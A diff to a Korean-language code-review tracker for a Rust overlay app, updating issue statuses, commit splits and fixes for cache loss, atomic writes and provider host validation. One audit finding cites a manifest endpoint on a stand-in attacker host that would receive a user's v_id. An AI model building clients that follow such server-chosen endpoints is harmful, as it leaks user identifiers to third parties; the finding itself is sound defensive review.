@@ -17,8 +17,8 @@
 | §2.2 | CRITICAL | UI 렌더 경로 매 프레임 DB 조회 | ✅ 완료 (업로드 플래그만) | `ac1063b` |
 | §3.1 | HIGH | `hdr_replay_test` 실패 | ✅ 원인 규명, `#[ignore]` | `2ed4543` |
 | §3.2 | HIGH | DXGI 출력 교체 실패를 삼킴 | ✅ 완료 (부수 효과 주의) | `a58a502` |
-| §3.3 | HIGH | V-Archive 전체 조회 빈 응답 시 캐시 소실 | ✅ 완료 (트레이드오프 기록 필요, 주석 정정 필요) | `ef56960` |
-| §3.4 | HIGH | Provider가 요청 대상 호스트 결정 + 비원자 쓰기 | ⚠️ 부분 완료 (재검토 필요) | `aeeb763` |
+| §3.3 | HIGH | V-Archive 전체 조회 빈 응답 시 캐시 소실 | ✅ 완료 (트레이드오프 사용자 확인 대기) | `ef56960`, `44f2d5f` |
+| §3.4 | HIGH | Provider가 요청 대상 호스트 결정 + 비원자 쓰기 | ⚠️ 부분 완료 (재검토 필요) | `070cfa8`, `63ae6d4` |
 | §3.5 | HIGH | Linux 오버레이가 IPC 표시 명령 무시 | ✅ 완료 | `9a556ca` |
 | §4.1 | MEDIUM | `with_retry`가 op을 4번째 실행 | ⏳ 미착수 | |
 | §4.2 | MEDIUM | `get_merged()` 매 프레임 deep clone | ⏳ 미착수 | |
@@ -37,7 +37,7 @@
 | §4.15 | MEDIUM | 마이그레이션 실패를 삼키고 `is_ready=true` | ⏳ 미착수 (§2.1 후속) | |
 | §4.16 | MEDIUM | `upsert` 트랜잭션 부재 | ⏳ 미착수 (재현 실패) | |
 | §4.17 | MEDIUM | OCR 잔존 설정/문서 | ⏳ 미착수 | |
-| §4.18 | MEDIUM | 이진화 대비율 문서 72% → 65% | ✅ 완료 | `aeeb763` |
+| §4.18 | MEDIUM | 이진화 대비율 문서 72% → 65% | ✅ 완료 | `98c2a9f` |
 | §4.19 | MEDIUM | `detect_rect_edges` margin unscaled | ⏳ 미착수 (측정 선행) | |
 | §4.20 | MEDIUM | IPC 인증/스레드 제한 부재 | ⏸️ 설계 의도 확인 대기 | |
 | §4.21 | MEDIUM | 벤치 바이너리 릴리스 포함 | ⏳ 미착수 | |
@@ -45,7 +45,7 @@
 | §4.23 | MEDIUM | Linux 정규화 부재 | ⏸️ 측정 전 보류 | |
 | §4.24 | MEDIUM | Linux 풀 프레임 2회 순회 | ⏳ 미착수 | |
 | §4.25 | MEDIUM | 문서-코드 드리프트 | ⚠️ 부분 완료 (슬롯 수만) | `4bcfbf2` |
-| §7.2 | — | 2026-10-02 후속 리뷰 지적 사항 | ⏳ 미착수 | |
+| §7.2 | — | 2026-10-02 후속 리뷰 지적 사항 | ⚠️ 진행 중 (1·4 완료) | |
 
 ---
 
@@ -162,7 +162,7 @@ fn ensure_schema(&self, conn: &mut Connection) {
 - **부수 효과 (인지된 트레이드오프)**: 이제 출력 교체 실패 시 상위 `windows/mod.rs:166-174`가 DXGI 백엔드를 파괴하고 **3초간 GDI로 강등**된다. §4.4가 문제로 지적한 강등 경로를 이 수정이 새로 타게 된다. 오염 프레임을 정상 입력으로 넘기는 것보다는 강등이 낫다고 판단했으나, §4.4 처리 시 이 경로도 함께 고려해야 한다.
 - **미검증**: 실제 멀티모니터 드래그 상황에서의 동작은 실앱으로 확인하지 않았다(유닛 테스트 없음).
 
-### 3.3 V-Archive 전체 조회가 빈 응답 한 번으로 캐시를 전량 소실 — ✅ 완료 (`ef56960`), 표현 정정 필요
+### 3.3 V-Archive 전체 조회가 빈 응답 한 번으로 캐시를 전량 소실 — ✅ 완료 (`ef56960`, 주석 정정 `44f2d5f`)
 
 - **파일**: `rust/overmax_data/src/store/record_db/sync.rs:27-38`
 - **정정 (2026-10-02)**: 최초 문서는 이를 "증분 동기화" 문제로 서술했으나 **반대다.** 호출부 `native_app.rs:1070`은 `clear_first = since.is_none()`이므로, DELETE가 실행되는 것은 `since` 없는 **전체 조회**와 레거시 JSON 마이그레이션(`schema.rs:157`)이다. 증분 조회(`clear_first=false`)는 원래 DELETE를 하지 않는다.
@@ -170,22 +170,22 @@ fn ensure_schema(&self, conn: &mut Connection) {
 - **AGENTS.md 근거**: CONTEXT.md 불변 조건 7(추천 엔진 실력 모델 통계 일관성), 「기존 호환성 파괴 금지」
 - **조치**: `records` 추출을 DELETE 앞으로 옮기고, 빈 배열이면 트랜잭션을 커밋하지 않고 `Ok(())` 반환. 회귀 테스트 2건 추가.
 - **트레이드오프 (명시 필요)**: 전체 조회에서 빈 배열은 **정상 상태일 수도 있다**(해당 버튼 모드에 기록이 없거나, V-Archive 기록을 초기화한 경우). 현재 수정은 이 경우에도 옛 캐시를 영구 보존한다. "일시 장애로 인한 빈 응답이 정상적인 빈 상태보다 훨씬 흔하고, 오래된 캐시가 남는 비용이 캐시 소실보다 작다"는 판단에 근거한 것이며, 이 판단은 사용자 확인 대상이다.
-- **후속 정정 필요**: `sync.rs:27` 주석의 "증분 동기화(clear_first=true)"와 테스트 `varchive_non_empty_merge_replaces_previous_entries`의 docstring "증분 동기화가 기존 항목을 대체"를 "전체 조회"로 고친다(§7.2).
+- **주석 정정 (완료, `44f2d5f`)**: `sync.rs:27` 주석과 회귀 테스트 docstring·assert 메시지의 "증분 동기화"를 "전체 조회"로 고쳤다. 코드 동작 변경 없음.
 
-### 3.4 외부 추천 Provider가 클라이언트의 요청 대상 호스트를 결정 — ⚠️ 부분 완료 (`aeeb763`), 재검토 필요
+### 3.4 외부 추천 Provider가 클라이언트의 요청 대상 호스트를 결정 — ⚠️ 부분 완료 (`070cfa8`, `63ae6d4`), 재검토 필요
 
 - **파일**: `rust/overmax_data/src/gateway/recommend_provider.rs:138-176`
 - **문제**:
   - (a) **서버 응답(`manifest.endpoint`)이 요청 대상 호스트를 결정한다.** `test_connection`(`:71-93`)은 `protocol` 문자열만 검증한다. Provider가 `endpoint: "https://attacker.example/collect"`를 지정하면 클라이언트가 `v_id`를 쿼리 파라미터로 붙여(`:153-156`) 전송한다.
   - (b) 응답 본문이 **검증 없이** `save_path`에 비원자 `fs::write`로 기록되어, 응답이 잘리면 다음 읽기(`composite.rs:98`)에서 JSON 파싱이 실패한다. `ProviderCacheReader`에 파일 크기 상한도 없다.
-- **조치 (`aeeb763`)**:
+- **조치**:
   - (a) `http(s)://` 분기에서 `provider_url`과 `manifest.endpoint`의 **host만** 비교하여 다르면 `GatewayError::InvalidProtocol` 반환.
   - (b) `fs::write`를 `save_path.with_extension("tmp")`에 쓴 뒤 `rename`하도록 변경.
 - **재검토 사항**:
   1. **host만 비교하고 scheme/port는 비교하지 않는다.** `https` provider가 `http://같은호스트/...`를 지정하면 `v_id`가 평문으로 전송된다. `(scheme, host, port)` origin 비교로 좁혀야 한다.
   2. **(b)는 §4.3.1의 결론과 모순된다.** §4.3.1은 "remove 없이 rename만 하면 Windows read-only 대상에서 `PermissionDenied`가 난다"는 실측으로 동일 수정을 되돌렸는데, 이 커밋은 같은 패턴을 새로 도입했다. `with_extension("tmp")` 이름 충돌(§4.3)도 그대로 가져왔다. §4.3의 해법이 정해지면 같은 방식으로 맞춘다.
   3. **회귀 테스트가 없다.** §2.1, §3.3, §4.11은 수정 전 코드에서 실패하는 테스트를 갖췄으나 이 항목만 빠졌다.
-  4. **커밋 규율 위반**: `aeeb763`은 (a), (b), §4.18 문서 정정이라는 세 가지 독립 결정을 한 커밋에 담았다(AGENTS.md 「하나의 diff에 여러 개의 독립된 결정을 뒤섞는 행위 금지」). push 전이라면 분리를 권한다(§7.2).
+  4. ~~**커밋 규율 위반**~~ — **해소.** 원래 `aeeb763` 한 커밋에 (a), (b), §4.18이 섞여 있었으나 push 전에 `070cfa8`(a), `63ae6d4`(b), `98c2a9f`(§4.18)로 분리했다.
 
 ### 3.5 Linux 오버레이가 IPC `set_overlay_visibility`를 무시 — ✅ 완료 (`9a556ca`)
 
@@ -408,13 +408,13 @@ if self.create_records_table(&conn).is_ok() && ... {
 - **문제**: `logo_ocr_cooldown_sec`를 읽는 소비자가 없다(정의 `settings.rs:457, 651`와 `settings.json:8`만 존재). `CONTEXT.md:11`의 "+ OCR (Windows OCR)", `CONTEXT.md:177`의 "Rate OCR 텔레메트리 지원", `detection_pipeline.rs:1244` 테스트 주석 "isolate OCR checksum bypass caches"는 2026-07-28 OCR 완전 제거 이후 유효하지 않다.
 - **수정**: 필드는 유지(호환성 — 「기존 호환성 파괴 금지」). CONTEXT.md 두 곳에서 OCR 서술을 제거하고 "Rate는 Pure Rust 템플릿 매칭(ZNCC) 기반"으로 갱신, 테스트 주석의 "OCR"를 "template cache"로 수정. **코드 로직 변경 없음.**
 
-### 4.18 이진화 대비율 72% 롤백이 문서에 미반영 — ✅ 완료 (`aeeb763`)
+### 4.18 이진화 대비율 72% 롤백이 문서에 미반영 — ✅ 완료 (`98c2a9f`)
 
 - **파일**: `rust/overmax_cv/src/image.rs:783` (`let calculated = (min as f32 + contrast * 0.65) as u8;`)
 - **문제**: `docs/decisions/detection_pipeline.md:75`와 `CONTEXT.md:12`가 "72%로 정밀 튜닝"을 현재 상태로 서술했다. `e3c1884`가 0.65→0.72로 올렸고 `8b52da6`(2026-09-11, ZNCC 소프트 매칭 도입)가 되돌렸으나 문서가 갱신되지 않았다.
 - **조치**: 코드 변경 없음. `CONTEXT.md`의 72%를 65%로 정정하고 `docs/decisions/detection_pipeline.md`에 롤백 행 추가.
 - **잔여**: `image.rs:1153` 테스트 주석의 "기존 하드 이진화(72% 대비)" 표현은 그대로다(과거형 서술이라 오해 소지는 작음).
-- **커밋 규율**: §3.4와 같은 커밋에 섞였다(§3.4 재검토 사항 4 참조).
+- **커밋 규율**: 원래 §3.4와 같은 커밋(`aeeb763`)에 섞여 있었으나 단독 커밋으로 분리했다.
 
 ### 4.19 `detect_rect_edges`의 margin 8이 unscaled
 
@@ -571,14 +571,17 @@ for (source, destination) in generation.map.chunks_exact(generation.stride)
 | 8 | §4.11 `since` 쿼리 이스케이프 | `74094d8` |
 | 9 | §4.11 `v_id` 경로 세그먼트 | `8185d53` |
 | 10 | §4.12 `AccountInfo` Debug 마스킹 | `b7147a8` |
-| 11 | §3.4 호스트 검증 + 원자 쓰기, §4.18 문서 정정 | `aeeb763` |
+| 11 | §3.4(a) 호스트 검증 | `070cfa8` |
+| 12 | §3.4(b) 임시 파일 + rename 쓰기 | `63ae6d4` |
+| 13 | §4.18 이진화 대비율 문서 정정 | `98c2a9f` |
+| 14 | §3.3 주석·docstring 정정 | `44f2d5f` |
 
 ### 7.2 2026-10-02 후속 리뷰 지적 사항 (우선 처리)
 
-1. **`aeeb763` 분리** — §3.4(a), §3.4(b), §4.18을 3개 커밋으로. 히스토리 재작성이므로 push 전에만, 사용자 승인 후 진행.
+1. ~~**`aeeb763` 분리**~~ — **완료.** `070cfa8`, `63ae6d4`, `98c2a9f`로 분리(push 전, 사용자 승인).
 2. **§3.4(a) origin 비교** — host만이 아니라 `(scheme, host, port)` 비교로 강화하고 회귀 테스트 추가.
 3. **§3.4(b) 재결정** — §4.3 해법과 일관되게 맞춘다. §4.3이 미정인 동안 되돌릴지, 유지하고 read-only 위험을 기록할지 결정.
-4. **§3.3 주석·docstring 정정** — "증분 동기화" → "전체 조회". 코드 동작 변경 없음, 단독 커밋.
+4. ~~**§3.3 주석·docstring 정정**~~ — **완료** (`44f2d5f`).
 5. **§3.3 트레이드오프 사용자 확인** — 전체 조회 빈 배열 시 옛 캐시 보존 방향 유지 여부(§6-19).
 
 ### 7.3 다음 착수 대상
